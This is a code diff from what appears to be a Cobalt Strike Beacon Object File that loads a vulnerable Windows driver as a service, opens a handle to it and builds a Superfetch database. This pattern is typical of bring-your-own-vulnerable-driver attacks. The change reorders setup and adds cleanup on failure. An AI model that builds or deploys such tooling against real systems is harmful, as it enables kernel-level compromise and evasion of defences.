@@ -102,37 +102,59 @@ int go(char *args, int argLen)
     }
 
 
-    if (!isServiceInstalled(provider))
+    // Get Windows Versions
+    char WindowsVersion[32];
+    if (!GetWinVersion(WindowsVersion, sizeof(WindowsVersion)))
     {
         BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
         BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
-    
-
-    // Get handle to driver
-    HANDLE hFile = CreateFileW(prov_info->device_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
-        BeaconFormatPrintf(&outputbuffer, "[!] Failed to get handle to vulnerable driver!\n");
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
-        BeaconFormatFree(&outputbuffer);
-        return FALSE;
-    }
-
-
-    char* WindowsVersion = GetWinVersion();
     BeaconFormatPrintf(&outputbuffer, "[+] Windows Version: %s\n", WindowsVersion);
 
     char* WindowsBuild = GetWinBuildNumber();
     BeaconFormatPrintf(&outputbuffer, "[+] Windows Build Number: %s\n", WindowsBuild);
 
 
-    if (!CreateGlobalSuperfetchDatabase())
+    // Install service
+    if (!isServiceInstalled(provider))
     {
         BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
         BeaconFormatFree(&outputbuffer);
+        return FALSE;
+    }
+
+
+    // Get handle to driver
+    HANDLE hFile = CreateFileW(prov_info->device_name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to get handle to vulnerable driver!\n");
+
+        if (!removeService(provider))
+        {
+            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
+        }
+
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconFormatFree(&outputbuffer);
+        return FALSE;
+    }
+
+
+    // Create Superfetch Database
+    if (!CreateGlobalSuperfetchDatabase())
+    {
+        if (!removeService(provider))
+        {
+            BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
+        }
+
+        BeaconFormatPrintf(&outputbuffer, "[+] Closing handle to vulnerable driver\n");
         CloseHandle(hFile);
+
+        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+        BeaconFormatFree(&outputbuffer);
         return FALSE;
     }
 
